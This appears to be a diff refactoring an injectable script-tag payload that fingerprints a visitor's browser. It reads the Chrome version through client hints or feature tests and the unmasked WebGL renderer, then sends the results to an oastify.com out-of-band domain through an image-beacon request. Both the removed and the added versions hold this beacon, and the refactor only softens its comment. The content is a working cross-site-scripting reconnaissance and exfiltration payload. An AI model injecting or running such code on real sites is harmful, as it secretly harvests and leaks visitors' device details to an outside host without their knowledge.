@@ -1,66 +1,77 @@
-<script>(async () => {
-    let chromeVersion = 'Unknown';
+<script>
+(async () => {
+  let chromeVersion = 'Unknown';
 
-    // Check if User-Agent Client Hints API is supported
-    if (navigator.userAgentData) {
-        try {
-            // Get detailed information using high entropy values
-            const details = await navigator.userAgentData.getHighEntropyValues([
-                'fullVersion', 'platform', 'architecture', 'model', 'uaFullVersion'
-            ]);
-
-            if (details.uaFullVersion) {
-                chromeVersion = `Chrome ${details.uaFullVersion}`;
-            } else if (details.fullVersion) {
-                chromeVersion = `Chrome ${details.fullVersion}`;
-            }
-        } catch (error) {
-            console.log('User-Agent Client Hints failed:', error);
-        }
+  // Attempt to use the User-Agent Client Hints API
+  if (navigator.userAgentData) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        'uaFullVersion', 'fullVersion'
+      ]);
+      if (hints.uaFullVersion) {
+        chromeVersion = `Chrome ${hints.uaFullVersion}`;
+      } else if (hints.fullVersion) {
+        chromeVersion = `Chrome ${hints.fullVersion}`;
+      }
+    } catch (err) {
+      console.error('User-Agent Client Hints API failed:', err);
     }
+  }
 
-    // Fallback: Feature Detection for Specific Chrome Versions
-    if (chromeVersion === 'Unknown') {
-        const testFeatures = {
-            '121': 'structuredClone',
-            '114': 'navigator.share',
-            '103': 'atob(btoa("test")) === "test"',
-            '96': 'navigator.clipboard.writeText',
-            '92': 'Intl.DateTimeFormat().resolvedOptions().calendar'
-        };
-
-        for (const [version, feature] of Object.entries(testFeatures)) {
-            try {
-                if (eval(feature)) {
-                    chromeVersion = `Chrome ${version}+ (Feature Detected)`;
-                    break;
-                }
-            } catch (e) { }
+  // Fallback: Feature detection if no version was retrieved above
+  if (chromeVersion === 'Unknown') {
+    // Define feature tests with associated Chrome version heuristics
+    const featureTests = [
+      { version: 121, test: () => 'structuredClone' in window },
+      { version: 114, test: () => 'share' in navigator },
+      { version: 103, test: () => {
+          try {
+            return atob(btoa("test")) === "test";
+          } catch (e) {
+            return false;
+          }
         }
+      },
+      { version: 96, test: () => 'clipboard' in navigator && typeof navigator.clipboard.writeText === 'function' },
+      { version: 92, test: () => {
+          try {
+            return Intl.DateTimeFormat().resolvedOptions().calendar !== undefined;
+          } catch (e) {
+            return false;
+          }
+        }
+      }
+    ];
+
+    // Sort the tests by version descending to detect the highest applicable version
+    featureTests.sort((a, b) => b.version - a.version);
+
+    for (const { version, test } of featureTests) {
+      if (test()) {
+        chromeVersion = `Chrome ${version}+ (Feature Detected)`;
+        break;
+      }
     }
+  }
 
-    // WebGL Rendering Check (Fingerprinting)
-    const getWebGLVersion = () => {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL info not available';
-        }
-        return 'WebGL not supported';
-    };
+  // WebGL Rendering Check (for additional fingerprinting or debugging)
+  function getWebGLRenderer() {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unavailable';
+    }
+    return 'WebGL not supported';
+  }
 
-    // Print or Send the Results
-    const webGLInfo = getWebGLVersion();
-    console.log(`Detected Chrome Version: ${chromeVersion}`);
-    console.log(`WebGL Renderer: ${webGLInfo}`);
+  const webGLRenderer = getWebGLRenderer();
+  console.log(`Detected Chrome Version: ${chromeVersion}`);
+  console.log(`WebGL Renderer: ${webGLRenderer}`);
 
-    // Send data to your OAST domain (for testing purposes)
-    const oastDomain = 'od547dymv9h693do4u2sfx1nze55t2hr.oastify.com';
-    const payload = encodeURIComponent(JSON.stringify({
-        chromeVersion,
-        webGLInfo
-    }));
-    const img = new Image();
-    img.src = `https://${oastDomain}/?data=${payload}`;
-})();</script>
+  // Optional: Send the data to an external domain (ensure you intend and secure this for production)
+  const oastDomain = 'od547dymv9h693do4u2sfx1nze55t2hr.oastify.com';
+  const payload = encodeURIComponent(JSON.stringify({ chromeVersion, webGLRenderer }));
+  new Image().src = `https://${oastDomain}/?data=${payload}`;
+})();
+</script>
